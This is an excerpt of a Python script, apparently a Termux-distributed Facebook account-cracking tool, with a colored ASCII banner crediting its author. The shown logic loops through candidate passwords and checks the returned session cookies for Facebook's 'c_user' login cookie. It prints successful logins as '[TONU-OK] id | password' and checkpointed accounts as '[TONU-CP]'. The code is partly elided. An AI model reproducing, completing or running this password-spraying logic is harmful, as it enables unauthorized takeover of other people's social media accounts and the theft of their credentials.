...
logo = ("""\033[132m
\033[1;32m __________________ ______ ____ ______  
/       \ /       \         /  |  /  |/      |/  \  /  | /      \ 
$$$$$$$  |$$$$$$$  |        $$ | /$$/ $$$$$$/ $$  \ $$ |/$$$$$$  |
$$ |__$$ |$$ |  $$ | ______ $$ |/$$/    $$ |  $$$  \$$ |$$ | _$$/ 
$$    $$< $$ |  $$ |/      |$$  $$<     $$ |  $$$$  $$ |$$ |/    |
...
\033[1;32m
\033[1;32m══════════════════════════════════════════════════════════\33[m 
        \033[1;32mOwner  :   MEHEDI HASAN TONU \33[m 																	    
       \033[1;32mGithub  :   TONU-143 \33[m 	    			   						                    
      \033[1;32mYouTube  :   BD-TERMUX \33[m 											               
\033[1;32m══════════════════════════════════════════════════════════\033[1;37m""")
loop = 0
oks = []
cps = []
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\033[1;32m[TONU-OK] '+cid+' | '+ps+'\033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\033[1;31m[TONU-CP] '+cid+' | '+ps+'\033[0;97m')
